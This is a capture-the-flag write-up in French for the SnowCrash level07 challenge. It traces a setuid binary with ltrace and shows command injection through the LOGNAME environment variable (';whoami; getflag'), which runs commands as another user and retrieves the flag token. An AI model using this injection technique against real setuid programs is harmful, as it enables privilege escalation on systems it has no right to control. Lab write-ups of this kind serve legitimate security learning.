On tombe sur un script dans le home, en l'executant, il retourne simplement cela :

```
level07@SnowCrash:~$ ./level07
level07
```

Lorsqu'on lance ltrace pour en savoir plus sur les flux d'appel de fonctions du programme, on trouve ceci : 

```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                 = 2007
geteuid()                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
getenv("LOGNAME")                                         = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                    = 0
+++ exited (status 0) +++
```

LOGNAME correspond donc à level07, et si on change LOGNAME, l'exécution de l'appel à system aussi : 


```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff804, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                 = 2007
geteuid()                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
getenv("LOGNAME")                                         = "test"
asprintf(0xbffff754, 0x8048688, 0xbfffff6c, 0xb7e5ee55, 0xb7fed280) = 15
system("/bin/echo test "test
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                    = 0
+++ exited (status 0) +++
```

On voit qu'on peut lui faire lancer des commandes en ajoutant par exemple un ; afin de lancer une nouvelle commande à la suite de echo :

```
level07@SnowCrash:~$ LOGNAME=';whoami'
level07@SnowCrash:~$ ./level07 

flag07
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7d4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                 = 2007
geteuid()                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
getenv("LOGNAME")                                         = ";whoami"
asprintf(0xbffff724, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo ;whoami "
level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                    = 0
+++ exited (status 0) +++
```

Ici on peut voir que /bin/echo est lancé en première commande, donnant l'espace vide, puis la commande whoami est lancée, retournant flag07 au lieu de level07 puisque le bit SUID est activé sur le programme.
Ajoutons simplement un getflag supplémentaire, et voici le résultat :

```
level07@SnowCrash:~$ LOGNAME=';whoami; getflag'
level07@SnowCrash:~$ ./level07 

flag07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Cette vulnérabilité est connue sous le nom de **env variable injection**, un autre exemple d'utilisation ici au level02 : 

- https://int0x33.medium.com/day-29-set-user-id-environment-variable-injection-path-user-for-linux-priv-esc-ea6c0adc19b8

